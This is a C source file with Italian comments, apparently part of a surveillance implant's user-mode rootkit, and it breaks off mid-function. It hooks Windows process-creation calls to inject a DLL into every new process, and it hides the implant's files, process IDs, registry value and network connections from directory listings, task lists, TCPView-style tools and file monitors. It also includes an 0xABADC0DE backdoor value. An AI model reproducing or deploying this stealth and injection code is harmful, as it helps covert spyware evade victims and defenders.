#include <stdio.h>
#include <stdlib.h>
#include <Winsock.h>
#include "HM_HooksSystemStruct.h"

#define HDUMMY 0xabadc0de
#define BACKDOOR 0xabadc0de

// XXX Fare le inizializzazioni delle variabili locali sempre dopo la MARK_HOOK (vedi anche MARK_SEARCH_LIMIT)

//
// definizione delle funzioni richiamate dai wrappers
//
typedef BOOL  (WINAPI *FreeLibrary_t) (HMODULE);
typedef FARPROC (WINAPI *GetProcAddress_t) (HMODULE, LPCSTR);
typedef HINSTANCE (WINAPI *LoadLibrary_t) (LPCTSTR);
typedef int (WINAPI *GetDeviceCaps_t) (HDC, int);
typedef HGDIOBJ (WINAPI *SelectObject_t) (HDC, HGDIOBJ);
typedef HDC (WINAPI *CreateCompatibleDC_t) (HDC);
typedef HBITMAP (WINAPI *CreateCompatibleBitmap_t) (HDC, int, int);
typedef BOOL  (WINAPI *BitBlt_t) (HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL  (WINAPI *StretchBlt_t) (HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
typedef BOOL (WINAPI *DeleteObject_t) (HGDIOBJ);
typedef BOOL (WINAPI *FillRect_t) (HDC, RECT *, HBRUSH);
typedef HBRUSH (WINAPI *CreateBrushIndirect_t) (LOGBRUSH *);
typedef NTSTATUS (WINAPI *NtEnumerateValueKey_t) (HANDLE, ULONG, DWORD, KEY_VALUE_BASIC_INFORMATION *, ULONG, PULONG);



///////////////////////////
//
//	CreateProcess
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char szDLLName[_MAX_PATH];
	char szHookThreadName[256];
	ResumeThread_T pResumeThread;
} NTCreateProcessRWStruct, *PNTCreateProcessRWStruct;

NTCreateProcessRWStruct NTCreateProcessRWData;

static DWORD __stdcall NtCreateProcessHook( DWORD ARG1,
											DWORD ARG2,
											DWORD ARG3,
											DWORD ARG4,
											DWORD ARG5,
											DWORD ARG6,
											DWORD ARG7,
											DWORD ARG8,
											DWORD ARG9,
											DWORD ARG10)
{
	HMODULE H4DLL;
	HANDLE hThreadRet;
	DWORD OldFlags;
	HM_sStartHookingThread_t psStartHookingThread;
	
	MARK_HOOK

	hThreadRet = 0;

	INIT_WRAPPER(NTCreateProcessRWStruct)

	// Il processo deve essere sospeso allo startup	
	// ARG6 = ARG6 | (DWORD)CREATE_SUSPENDED;
	// Memorizza i vecchi flag
	__asm{
		PUSH EAX
		MOV EAX, DWORD PTR [EBP+0x1C]
		MOV [OldFlags], EAX
		OR EAX, 0x04
		MOV DWORD PTR [EBP+0x1C], EAX
		POP EAX
	}

	// CAll api
	CALL_ORIGINAL_API(10)	

	// Se fallisce ritorna
	if (!ret_code)
		return ret_code;
	
	// Carica H4
	H4DLL = pData->_LoadLibrary(pData->szDLLName);
	// Se non riesce a caricare la DLL (es: e' stato
	// disinstallato) avvia il thread principale (se deve)
	// (Non wrappa i processi aperti in debug)
	if (!H4DLL || (OldFlags & DEBUG_ONLY_THIS_PROCESS) || (OldFlags & DEBUG_PROCESS)) {
		if (H4DLL)
			pData->_FreeLibrary(H4DLL);
		if (!(OldFlags & CREATE_SUSPENDED)) 
			pData->pResumeThread(((PROCESS_INFORMATION *)ARG10)->hThread);
		return ret_code;
	}

	// Indirizzo StartHookingThread
	psStartHookingThread = (HM_sStartHookingThread_t)pData->_GetProcAddress(H4DLL, pData->szHookThreadName);
	
	// Creazione ed esecuzione del Threddino
	if(((PROCESS_INFORMATION *)ARG10)->hProcess && ((PROCESS_INFORMATION *)ARG10)->hThread) {
	    // Se CreateProcess e' richiamata con CREATE_SUSPENDED, azzera dwThid
		// in maniera che il threadino non faccia la resume del thread principale
		if (OldFlags & CREATE_SUSPENDED)
			hThreadRet = psStartHookingThread(((PROCESS_INFORMATION *)ARG10)->dwProcessId, 0, TRUE, FALSE);
		else
			hThreadRet = psStartHookingThread(((PROCESS_INFORMATION *)ARG10)->dwProcessId, ((PROCESS_INFORMATION *)ARG10)->dwThreadId, TRUE, FALSE);
	}
	
	// Qualcosa e' andato storto resume del main thread
	if (hThreadRet == INVALID_HANDLE_VALUE && !(OldFlags & CREATE_SUSPENDED)) 
		pData->pResumeThread(((PROCESS_INFORMATION *)ARG10)->hThread);
	
	// Scarica H4
	pData->_FreeLibrary(H4DLL);

	return ret_code;
}

static DWORD NtCreateProcessHook_setup(HMServiceStruct *pData)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(NTCreateProcessRWData._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"))
	VALIDPTR(NTCreateProcessRWData._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"))
	VALIDPTR(NTCreateProcessRWData._FreeLibrary = (FreeLibrary_T) HM_SafeGetProcAddress(hMod, "FreeLibrary"))
	VALIDPTR(NTCreateProcessRWData.pResumeThread = (ResumeThread_T) HM_SafeGetProcAddress(hMod, "ResumeThread"))

	// Non lo prendiamo dai nomi guessati perche' la shared potrebbe non essere caricata
	// se stiamo girando in un servizio
	if (!FindModulePath(NTCreateProcessRWData.szDLLName, sizeof(NTCreateProcessRWData.szDLLName)))
		return 1;

	sprintf(NTCreateProcessRWData.szHookThreadName, "%s", "PPPFTBBP02");
	NTCreateProcessRWData.dwHookLen = 300;

	return 0;
}



///////////////////////////
//
//	CreateProcessAsUser
//
///////////////////////////

static DWORD __stdcall NtCreateProcessAsUserHook( DWORD ARG1,
												  DWORD ARG2,
												  DWORD ARG3,
												  DWORD ARG4,
												  DWORD ARG5,
												  DWORD ARG6,
												  DWORD ARG7,
												  DWORD ARG8,
												  DWORD ARG9,
												  DWORD ARG10,
												  DWORD ARG11)
{
	HMODULE H4DLL;
	HANDLE hThreadRet;
	DWORD OldFlags;
	HM_sStartHookingThread_t psStartHookingThread;
	
	MARK_HOOK

	hThreadRet = 0;

	INIT_WRAPPER(NTCreateProcessRWStruct)

	// Il processo deve essere sospeso allo startup	
	// ARG7 = ARG7 | (DWORD)CREATE_SUSPENDED;
	// Memorizza i vecchi flag
	__asm{
		PUSH EAX
		MOV EAX, DWORD PTR [EBP+0x20]
		MOV [OldFlags], EAX
		OR EAX, 0x04
		MOV DWORD PTR [EBP+0x20], EAX
		POP EAX
	}

	// CAll api
	CALL_ORIGINAL_API(11)	

	// Se fallisce ritorna
	if (!ret_code)
		return ret_code;
	
	// Carica H4
	H4DLL = pData->_LoadLibrary(pData->szDLLName);
	// Se non riesce a caricare la DLL (es: e' stato
	// disinstallato) avvia il thread principale (se deve)
	// (Non wrappa i processi aperti in debug)
	if (!H4DLL || (OldFlags & DEBUG_ONLY_THIS_PROCESS) || (OldFlags & DEBUG_PROCESS)) {
		if (H4DLL)
			pData->_FreeLibrary(H4DLL);
		if (!(OldFlags & CREATE_SUSPENDED)) 
			pData->pResumeThread(((PROCESS_INFORMATION *)ARG11)->hThread);
		return ret_code;
	}

	// Indirizzo StartHookingThread
	psStartHookingThread = (HM_sStartHookingThread_t)pData->_GetProcAddress(H4DLL, pData->szHookThreadName);
	
	// Creazione ed esecuzione del Threddino
	if(((PROCESS_INFORMATION *)ARG11)->hProcess && ((PROCESS_INFORMATION *)ARG11)->hThread) {
	    // Se CreateProcess e' richiamata con CREATE_SUSPENDED, azzera dwThid
		// in maniera che il threadino non faccia la resume del thread principale
		if (OldFlags & CREATE_SUSPENDED)
			hThreadRet = psStartHookingThread(((PROCESS_INFORMATION *)ARG11)->dwProcessId, 0, TRUE, FALSE);
		else
			hThreadRet = psStartHookingThread(((PROCESS_INFORMATION *)ARG11)->dwProcessId, ((PROCESS_INFORMATION *)ARG11)->dwThreadId, TRUE, FALSE);
	}
	
	// Qualcosa e' andato storto resume del main thread
	if (hThreadRet == INVALID_HANDLE_VALUE && !(OldFlags & CREATE_SUSPENDED)) 
		pData->pResumeThread(((PROCESS_INFORMATION *)ARG11)->hThread);
	
	// Scarica H4
	pData->_FreeLibrary(H4DLL);

	return ret_code;
}


//////////////////////////
//
// NtQueryDirectoryFile
//
//////////////////////////
#define HIDE_NAME_COUNT 3
typedef struct {
	COMMONDATA;
	char name_to_hide[HIDE_NAME_COUNT][MAX_RAND_NAME];
	memcpy_t pMemcpy;
} NtQueryDirectoryFileStruct;

NtQueryDirectoryFileStruct NtQueryDirectoryFileData;

static  DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1 ,
												  DWORD ARG2,
												  DWORD ARG3,
												  DWORD ARG4,
												  DWORD ARG5,
												  char *FileInformation,
												  ULONG FileInformationLength,
												  DWORD FileInformationClass,
												  DWORD ARG9,
												  DWORD ARG10,
												  DWORD ARG11)
{
	DWORD b_len, jj;
	DWORD *old_b_len;
	char *Src;
	char *file_name;
	DWORD file_name_len;
	BOOLEAN found;
	BOOL *Active;
	BOOL is_to_hide;

#define NO_SUCH_FILE 0xC000000F
	
	MARK_HOOK

	old_b_len = NULL;
	file_name = NULL;
	file_name_len = 0;
	found = FALSE;

	INIT_WRAPPER(NtQueryDirectoryFileStruct)

	CALL_ORIGINAL_API(11)
	
	if(ret_code != 0 || FileInformationLength <= 0)
	   return ret_code;

	// Se e' attivo il crisi agent (per il system),
	// allora non nasconde i file
	if (pData->pHM_IpcCliRead) {
		Active = (BOOL *)pData->pHM_IpcCliRead(PM_CRISISAGENT);
		if (!Active || (*Active))
			return ret_code;
	}
		
	Src = (char *)FileInformation;

	if (FileInformationClass != FileDirectoryInformation &&
		FileInformationClass != FileFullDirectoryInformation &&
		FileInformationClass != FileBothDirectoryInformation &&
		FileInformationClass != FileNamesInformation &&
		FileInformationClass != FileIdBothDirInformation &&
		FileInformationClass != FileIdFullDirectoryInformation)
		return ret_code;

	do {
		// Tanto per tutte le strutture e' sempre la prima entry
		b_len = ((FILE_DIRECTORY_INFORMATION *)Src)->NextEntryOffset;

		if (FileInformationClass == FileDirectoryInformation) {
			file_name = (char *)(((FILE_DIRECTORY_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_DIRECTORY_INFORMATION *)Src)->FileNameLength);
		}

		if (FileInformationClass == FileFullDirectoryInformation) {
			file_name = (char *)(((FILE_FULL_DIRECTORY_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_FULL_DIRECTORY_INFORMATION *)Src)->FileNameLength);
		}

		if (FileInformationClass == FileBothDirectoryInformation) {
			file_name = (char *)(((FILE_BOTH_DIRECTORY_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_BOTH_DIRECTORY_INFORMATION *)Src)->FileNameLength);
		}

		if (FileInformationClass == FileNamesInformation) {
			file_name = (char *)(((FILE_NAMES_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_NAMES_INFORMATION *)Src)->FileNameLength);
		}

		if (FileInformationClass == FileIdBothDirInformation) {
			file_name = (char *)(((FILE_ID_BOTH_DIR_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_ID_BOTH_DIR_INFORMATION *)Src)->FileNameLength);
		}

		if (FileInformationClass == FileIdFullDirectoryInformation) {
			file_name = (char *)(((FILE_ID_FULL_DIR_INFORMATION *)Src)->FileName);
			file_name_len = (DWORD)(((FILE_ID_FULL_DIR_INFORMATION *)Src)->FileNameLength);
		}

		file_name_len /=2; // E' unicode

		// Vede se dobbiamo cancellare questa entry
		is_to_hide = FALSE;
		for (jj=0; jj<HIDE_NAME_COUNT; jj++) {
			IF_LSTRCMP(file_name, name_to_hide[jj], file_name_len) { 
				is_to_hide = TRUE;
				break;
			}
		}

		if (is_to_hide) {
			if (old_b_len) {
				*old_b_len += b_len;
				
				// E' l'ultima entry
				if (b_len == 0)
					*old_b_len = 0;
			} else {// E' la prima entry
				FileInformationLength -= b_len;
				if (FileInformationLength >0) {
					pData->pMemcpy(Src, Src + b_len, FileInformationLength); 
					Src -= b_len; // Per compensare il + di dopo 
				}
			}
		} else {
			found = TRUE;
			old_b_len = &((FILE_DIRECTORY_INFORMATION *)Src)->NextEntryOffset;
		}

		Src += b_len;
	} while(b_len!=0);

	if (!found)
		return NO_SUCH_FILE;
	
	return ret_code;
}


static DWORD NtQueryDirectoryFileHook_setup(HMServiceStruct *pData)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
	VALIDPTR(NtQueryDirectoryFileData.pMemcpy = (memcpy_t) HM_SafeGetProcAddress(hMod, "memcpy"))
	memcpy(NtQueryDirectoryFileData.name_to_hide[0], H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide[0])); // E' sicuramente NULL terminato
	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[1], MAX_RAND_NAME, _TRUNCATE, "%s.exe", EXE_INSTALLER_NAME);
	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[2], MAX_RAND_NAME, _TRUNCATE, "%s.exe", "efi_installer.exe");

	// Variabili shared per la creazione degli Hooks...
	NtQueryDirectoryFileData.dwHookLen = 850;
	NtQueryDirectoryFileData.pHM_IpcCliRead = pData->pHM_IpcCliRead;

	return 0;
}


///////////////////////////
//
// NTQuerySystemInformation
//
///////////////////////////

typedef struct {
	COMMONDATA;
} NTQuerySystemInformationStruct;

NTQuerySystemInformationStruct NTQuerySystemInformationData;

#define IF_PID_NOT_PRESENT(x,y) BOOL pid_present = FALSE; \
	                            pid_hide_struct *p_phs = y; \
	                            if (p_phs) while (IS_SET_PID_HIDE_STRUCT((*p_phs))) { \
									if (p_phs->PID == x) { \
										pid_present = TRUE; \
										break; \
									} \
									p_phs++; \
								} if (!pid_present)

static DWORD WINAPI NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS pSystemInformationClass,
												 PVOID	pSystemInformation,
												 LONG	SystemInformationLength,
												 PULONG ReturnLength)
{
	SYSTEM_PROCESS_INFORMATION *Spi;
	SYSTEM_PROCESS_INFORMATION *PrevSpi;
	BYTE *SPI_Offs;
	pid_hide_struct *p_pid_hide;

	MARK_HOOK

	Spi = NULL;
	PrevSpi = NULL;

	INIT_WRAPPER(NTQuerySystemInformationStruct)

	CALL_ORIGINAL_API(4)

	if (ret_code >= 0x40000000)
		return ret_code;

	// Legge la lista dei PID da nascondere
	p_pid_hide = (pid_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_PID);

	SPI_Offs = (BYTE *)pSystemInformation;

	if (pSystemInformationClass == SystemProcessInformation && 
		pSystemInformation != NULL) {
		do {
			Spi = (SYSTEM_PROCESS_INFORMATION *) SPI_Offs;

			if ( SPI_Offs + sizeof(SYSTEM_PROCESS_INFORMATION) > (BYTE *) pSystemInformation + SystemInformationLength )
				break;
			
			IF_PID_NOT_PRESENT(Spi->UniqueProcessId, p_pid_hide) 
				PrevSpi = Spi;
			else {
				// Unlinka la struttura del nostro processo
				if(PrevSpi)
					PrevSpi->NextEntryOffset += Spi->NextEntryOffset;
				// Se e' l'ultimo processo, termina la lista
				if (Spi->NextEntryOffset == 0)
					PrevSpi->NextEntryOffset = 0;
			}
		
			SPI_Offs += Spi->NextEntryOffset;

		} while(Spi->NextEntryOffset);
	}
	
	return ret_code;
}

DWORD NtQuerySystemInformationHook_setup(HMServiceStruct *pData)
{

//--------------
	// Per BlackLiht non facciamo nascondere i PID a explorer.exe
	// ...tanto explorer di per se non ha una funzione per listare
	// i processi
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');

	if (proc_name) {
		proc_name++;
		if (!stricmp(proc_name, "explorer.exe"))
			return 1;
	} 
//----------------

	NTQuerySystemInformationData.dwHookLen = 400;
	NTQuerySystemInformationData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	return 0;
}

///////////////////////////
//
// NtDeviceIoControlFile
//
///////////////////////////
#define EOFFSET(X,Y) ((int) X - (int) Y) 				
#define NEXTSTR(X) while( *X != 0 && *X != 9 ) X++;
#define GETPIDSTR(X) while( *X != ':' && *X != 0 && *X != 9 ) X++;
#define COLDLOOP(X) for(;X>0; X--) 
//
// PATCH per win2k :
// se p_chs->ip_address == [IP da nascondere] allora memorizzo la sua localport
// se scandendo le successive entry nella lista trovo la stessa localport con 0.0.0.0
// tolgo pure questa...
#define IF_CON_NOT_PRESENT(x,y) BOOL con_present = FALSE; \
		                        connection_hide_struct *p_chs = y; \
	                            if (p_chs) while (IS_SET_CONNETCION_HIDE_STRUCT((*p_chs))) { \
									if ( (p_chs->ip_address == x->dwRemoteAddr) || (x->dwLocalAddr == 0 && x->dwLocalPort == pData->dwLocalPort && pData->dwLocalPort) ) { \
										con_present = TRUE;  \
										break; \
									} \
									p_chs++; \
								} if (!con_present)
// Patch per Win2K
// Per ricerca localport di Internet Explorer
//
#define IF_CON_PRESENT(x,y) BOOL con_presentTmp = FALSE; \
		                        connection_hide_struct *p_chsTmp = y; \
	                            if (p_chsTmp) while ( IS_SET_CONNETCION_HIDE_STRUCT((*p_chsTmp)) ) { \
									if ( (p_chsTmp->ip_address == x->dwRemoteAddr) && (p_chsTmp->port == x->dwRemotePort) ) { \
										con_presentTmp = TRUE;  \
										break; \
									} \
									p_chsTmp++; \
								} if (con_presentTmp)
typedef struct {
	DWORD dwCnt;
	DWORD dwData1;
	DWORD dwData2;
	DWORD dwTime;
	DWORD dwMillisec;
	char szInfo[4];
} FileMonDevStruct;



typedef struct {
	COMMONDATA;
	atoi_t pAtoi;
	memcpy_t pMemcpy;
	DWORD dwLocalPort;
} NTDeviceIOControlFileStruct;

NTDeviceIOControlFileStruct NTDeviceIOControlFileData;

#define TCPVIEW_DEV 1
#define FILEMON_DEV 2
#define VISTA_NSI 3
#define TCP_STD 1
#define TCP_EXT 2
#define TCP_SUP 3

DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
										  DWORD ARG2,
										  DWORD ARG3,
										  DWORD ARG4,
										  PIO_STATUS_BLOCK IoStatusBlock,
										  ULONG IoControlCode,
										  char *InputBuffer,
										  ULONG InputBufferLength,
										  PVOID OutputBuffer,
										  ULONG OutputBufferLength)
{
	DWORD ext, dwType;
	FileMonDevStruct * pFmEntry;
	DWORD dwPid;
	char *pTmp;
	char *DestEntry;
	char *CurEntry;
	char *NxtEntry;
	int NumStr, NumBytes;
	char szPID[8];
	connection_hide_struct *p_connection_hide;
	pid_hide_struct *p_pid_hide;
	BOOL to_hide_block;

	MARK_HOOK

	// Inizializzazione
	ext = 0;
	dwType = FALSE;
	CurEntry = 0;
	NxtEntry = 0;
	NumBytes = 0;

	// Altrimenti il compiler usa i parametri di chiamata!!!
	__asm {
		PUSH ESI
		MOV ESI, DWORD PTR [EBP+0x28]
		MOV [pTmp], ESI
		MOV [DestEntry], ESI
		MOV [dwPid], 0xFFFFFFFF
		POP ESI
	}
		
	INIT_WRAPPER(NTDeviceIOControlFileStruct)

	// Connessioni tcp
	if(	IoControlCode		== 0x000120003 &&
		InputBuffer && 
		OutputBuffer &&  
		OutputBufferLength	> 0 && 
		InputBufferLength	> 0 &&
		InputBuffer[0]		== 0x00 && 
		InputBuffer[1]		== 0x04 && 
		InputBuffer[17]		== 0x01)
	{
			dwType = TCPVIEW_DEV;
		
			if (InputBuffer[16] == 0x2) 
				ext = TCP_EXT;
			else if (InputBuffer[16] == 0x1) 
				ext = TCP_STD;
			else
				ext = TCP_SUP;
	} else if(IoControlCode  == 0x8300000B) { 
		dwType = FILEMON_DEV;			
	} else if (IoControlCode == 0x00012001B) {
		dwType = VISTA_NSI;
	}
		

	CALL_ORIGINAL_API(10)

	// Se ritorna un errore, bisogna non fare il lavoro
	// di parsing dell'output
	if (ret_code != 0)
		return ret_code;

	// Legge la lista delle connessioni da nascondere per usarla nella 
	// scansione delle row semplici
	p_connection_hide = (connection_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_CON);

	// Legge la lista di PID da nascondere per usarla nella scansione
	// delle row extended o dei file handle
	p_pid_hide = (pid_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_PID);

	// Parsing dell'array delle conessioni....
	if(dwType == TCPVIEW_DEV) {
		DWORD len = IoStatusBlock->Information;	
		MIB_TCPROW_EX *row_ex;
		MIB_TCPROW *row;
		MIB_TCPROW_SUP *row_sup;
		char *Src;
		char *Dst;

		// XXX - Cerca la localport per il fix su Win2K
		// NB. si presuppone che ci sia una sola connessione
		// al server... (uso solo wCon_present_port) 
		// non viene gestita la eventualita' in cui ci siano piu' entry in p_connection_hide
		Src = (char *)OutputBuffer;
		DWORD lenTmp = IoStatusBlock->Information;	
		while ( (ext==TCP_STD && lenTmp >= sizeof(MIB_TCPROW)) && *((DWORD *)Src)!=0 ) {
			MIB_TCPROW *pEntry = (MIB_TCPROW *)Src; 
			IF_CON_PRESENT( pEntry, p_connection_hide) {	
				pData->dwLocalPort = ((MIB_TCPROW *) Src)->dwLocalPort;
				break;
			}
			Src    += sizeof(MIB_TCPROW);
			lenTmp -= sizeof(MIB_TCPROW); 
		}

		Src = (char *)OutputBuffer;
		Dst = (char *)OutputBuffer;
		IoStatusBlock->Information = 0;
		while ( (ext==TCP_EXT && len >= sizeof(MIB_TCPROW_EX)) || 
			    (ext==TCP_STD && len >= sizeof(MIB_TCPROW)) ||
				(ext==TCP_SUP && len >= *((DWORD *)Src) && *((DWORD *)Src)!=0)) {
			if(ext==TCP_EXT)	{	
				row_ex = (MIB_TCPROW_EX *)Src;
				// XXX Nasconde tutte le connessioni che non sono in listen o in established
				if (row_ex->dwState == 2 || row_ex->dwState == 5) {
					IF_PID_NOT_PRESENT(row_ex->dwProcessId, p_pid_hide)	{
						IF_CON_NOT_PRESENT(row_ex, p_connection_hide) {
							pData->pMemcpy(Dst, Src, sizeof(MIB_TCPROW_EX));
							Dst += sizeof(MIB_TCPROW_EX);
							IoStatusBlock->Information  += sizeof(MIB_TCPROW_EX);
						}
					}
				}
				Src += sizeof(MIB_TCPROW_EX);
				len -= sizeof(MIB_TCPROW_EX);
			} else if(ext==TCP_STD) {
				row = (MIB_TCPROW *)Src;
				// XXX Nasconde tutte le connessioni che non sono in listen o in established
				if (row->dwState == 2 || row->dwState == 5) {
					IF_CON_NOT_PRESENT(row, p_connection_hide) {
						pData->pMemcpy(Dst, Src, sizeof(MIB_TCPROW));
						Dst += sizeof(MIB_TCPROW);
						IoStatusBlock->Information += sizeof(MIB_TCPROW);
					}
				}
				Src += sizeof(MIB_TCPROW);
				len -= sizeof(MIB_TCPROW);
			} else {
				row_sup = (MIB_TCPROW_SUP *)Src;
				if (row_sup->dwState == 2 || row_sup->dwState == 5) {
					IF_PID_NOT_PRESENT(row_sup->dwProcessId, p_pid_hide) {
						IF_CON_NOT_PRESENT(row_sup, p_connection_hide) {
							pData->pMemcpy(Dst, Src, row_sup->dwTot);
							Dst += row_sup->dwTot;
							IoStatusBlock->Information += row_sup->dwTot;
						}
					}
				}
				Src += row_sup->dwTot;
				len -= row_sup->dwTot;
			}
		}
	} else 	
		// Parsing array dei file handle 
		if(dwType == FILEMON_DEV) {

			while( pTmp < ((char *)OutputBuffer + IoStatusBlock->Information) ){
				
				// Nuova Entry
				CurEntry = pTmp;

				// Numero di stringe nell'entry 
				// in base alla seconda DWORD
				if( ((FileMonDevStruct*)pTmp)->dwData1 )
					NumStr = 5;
				else
					NumStr = 4;

				// La stringa...
				pTmp = ((FileMonDevStruct*)pTmp)->szInfo;

				// Cerca il Pid
				GETPIDSTR(pTmp)

				// Trovato il Pid
				if( *pTmp == ':' ) {
					int a = 0;
					do {
						pTmp++;
						szPID[a] = *pTmp;
						a++;
					} while( *pTmp != 0 && *pTmp != 9 );

					pTmp++;
					szPID[a-1] = 0;
					NumStr--;

					// Usato per matchare le entry da nascondere
					dwPid = (DWORD) pData->pAtoi(szPID);
				} 
								
				// Skip delle altre stringhe
				to_hide_block = FALSE;
				COLDLOOP(NumStr)
				{
					//NEXTSTR(pTmp)
					// Se nelle stringhe c'e' _( allora non copia
					// la riga
					while( *pTmp != 0 && *pTmp != 9 ) {
						if (*pTmp == '_' && *(pTmp+1) == '(')
							to_hide_block = TRUE;
						pTmp++;
					}
					pTmp++;
				}

				// Align Entry
				while( ((pTmp - OutputBuffer)%4) )
					pTmp++;

				// Prossimo elemento e marker di fine 
				// di quello corrente
				NxtEntry = pTmp;

				// Se deve nascondere per questioni di nome
				// allora continua il loop (non copiando la stringa)
				if (to_hide_block)
					continue;

				// se non lo devo nascondere lo ricopio...
				IF_PID_NOT_PRESENT(dwPid, p_pid_hide) {
					pData->pMemcpy(DestEntry, CurEntry, EOFFSET(NxtEntry,CurEntry));
					NumBytes += EOFFSET(NxtEntry,CurEntry);
					DestEntry += EOFFSET(NxtEntry,CurEntry);
				} 
			}

			// Aggiorna la lunghezza dell'array...
			IoStatusBlock->Information = NumBytes;
		} else if (dwType == VISTA_NSI) {
			DWORD counter_src, counter_dst, tot_entry;
			NSI_PARAMS *nsi_par = (NSI_PARAMS *)OutputBuffer;
			MIB_TCPROW row, *prow;

			if (nsi_par->row && nsi_par->status && nsi_par->type==0x38) {
				tot_entry = nsi_par->count;
				nsi_par->count = 0;
				counter_src = counter_dst = 0;

				for (; counter_src<tot_entry; counter_src++) {
					row.dwLocalAddr = nsi_par->row[counter_src].local_address;
					row.dwRemoteAddr = nsi_par->row[counter_src].remote_address;
					row.dwLocalPort = nsi_par->row[counter_src].local_port;
					row.dwRemotePort = nsi_par->row[counter_src].remote_port;
					row.dwState = nsi_par->status[counter_src].status;
					prow = &row;

					// XXX Nasconde tutte le connessioni che non sono in listen o in established
					if (prow->dwState==2 || prow->dwState==5) {
						IF_CON_NOT_PRESENT(prow, p_connection_hide) {
							pData->pMemcpy(&(nsi_par->row[counter_dst]), &(nsi_par->row[counter_src]), sizeof(TCP_VISTA_ROW));
							pData->pMemcpy(&(nsi_par->status[counter_dst]), &(nsi_par->status[counter_src]), sizeof(TCP_VISTA_STATUS));
							counter_dst++;
							nsi_par->count++;
						}
					}
				}
			}
		}

    return ret_code;
}

DWORD NtDeviceIoControlFileHook_setup(HMServiceStruct *pData)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
	VALIDPTR(NTDeviceIOControlFileData.pAtoi = (atoi_t) HM_SafeGetProcAddress(hMod, "atoi"))
	VALIDPTR(NTDeviceIOControlFileData.pMemcpy = (memcpy_t) HM_SafeGetProcAddress(hMod, "memcpy"))
	NTDeviceIOControlFileData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	NTDeviceIOControlFileData.dwLocalPort = 0;
	NTDeviceIOControlFileData.dwHookLen = 1800;
	return 0;
}




///////////////////////////
//
// NtEnumerateValueKey
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char name_to_hide[MAX_RAND_NAME];
} NtEnumerateValueKeyStruct;

NtEnumerateValueKeyStruct NtEnumerateValueKeyData;

DWORD __stdcall NtEnumerateValueKeyHook(DWORD ARG1,
                                        DWORD RIndex,
                                        DWORD InformationClass,
                                        DWORD *KeyValueInformation,
                                        DWORD InformationLen,
                                        DWORD *ResultLen)
{

	char *value_name;
	BOOL loop;
	BOOL backdoor;
	DWORD t_index;
	DWORD r_index;
	DWORD found;
	DWORD information_class;
	DWORD *arg_ptr;
	DWORD name_len;

	MARK_HOOK

	t_index = 0;
	found = 0;

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	// Backdoor! Mettendo information_class == 0xABADC0DE
	// non viene nascosta la chiave (usata per il wrapper 
	// di enumerazione).
	if (arg_ptr[2] == BACKDOOR) {
		backdoor = TRUE;
		arg_ptr[2] = 0;
	} else 
		backdoor = FALSE;

	r_index = arg_ptr[1]; // r_index = RIndex;
	information_class = arg_ptr[2]; // information_class = InformationClass;

	INIT_WRAPPER(NtEnumerateValueKeyStruct)
	
	do {
		loop = FALSE;
		arg_ptr[2] = 0; //InformationClass = 0;
		arg_ptr[1] = t_index; //RIndex = t_index;
		CALL_ORIGINAL_API(6)

		// If success. RIndex e' quello richiesto.
		if ((*ResultLen)>0 && ret_code==0) {
			value_name = (char *)(((KEY_VALUE_BASIC_INFORMATION *)KeyValueInformation)->Name);
			name_len = (DWORD)(((KEY_VALUE_BASIC_INFORMATION *)KeyValueInformation)->NameLength);
			name_len /= 2; // E' in unicode 
			// Se non e' la chiave da nascondere o e' richiamata come 
			// backdoor, incrementa il numero delle chiavi da far vedere.
			found++;
			IF_LSTRCMP(value_name, name_to_hide, name_len)
				if (!backdoor)
					found--;

			if (found <= r_index) {
				t_index++;
				loop = TRUE;
			}
		}
	} while(loop);

	arg_ptr[2] = information_class; //InformationClass = information_class;
	CALL_ORIGINAL_API(6)

	return ret_code;
}


DWORD NtEnumerateValueKeyHook_setup(HMServiceStruct *pData)
{
	memcpy(NtEnumerateValueKeyData.name_to_hide, REGISTRY_KEY_NAME, sizeof(NtEnumerateValueKeyData.name_to_hide)); // E' sicuramente NULL terminato
	NtEnumerateValueKeyData.dwHookLen = 1000;
	return 0;
}



///////////////////////////
//
//   NtQueryKey
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char name_to_hide[MAX_RAND_NAME];
	NtEnumerateValueKey_t pNtEnumerateValueKey;
} NtQueryKeyStruct;

NtQueryKeyStruct NtQueryKeyData;

DWORD __stdcall NtQueryKeyHook(DWORD ARG1,
                               DWORD InformationClass,
                               KEY_FULL_INFORMATION *KeyInformation,
                               DWORD InformationLen,
                               DWORD *ResultLen)
{
	DWORD index;
	DWORD *arg_ptr;
